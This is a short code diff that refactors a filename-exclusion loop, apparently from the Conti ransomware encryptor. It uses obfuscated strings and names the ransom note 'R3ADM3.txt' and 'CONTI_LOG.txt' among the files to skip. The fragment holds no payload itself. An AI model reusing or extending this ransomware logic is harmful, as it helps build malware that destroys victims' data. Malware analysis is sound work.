@@ -75,18 +75,15 @@ CheckFilename(__in LPCWSTR FileName)
 		OBFW(L".msi"),
 		OBFW(L"R3ADM3.txt"),
 		OBFW(L"CONTI_LOG.txt")
-
 	};
 
 	if (pStrStrIW(FileName, global::GetExtention())) {
 		return FALSE;
 	}
 
-	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
-	for (INT i = 0; i < Count; i++) {
-		if (pStrStrIW(FileName, BlackList[i])) {
+	for(LPCWSTR bl : BlackList) {
+		if (pStrStrIW(FileName, bl))
 			return FALSE;
-		}
 	}
 
 	return TRUE;
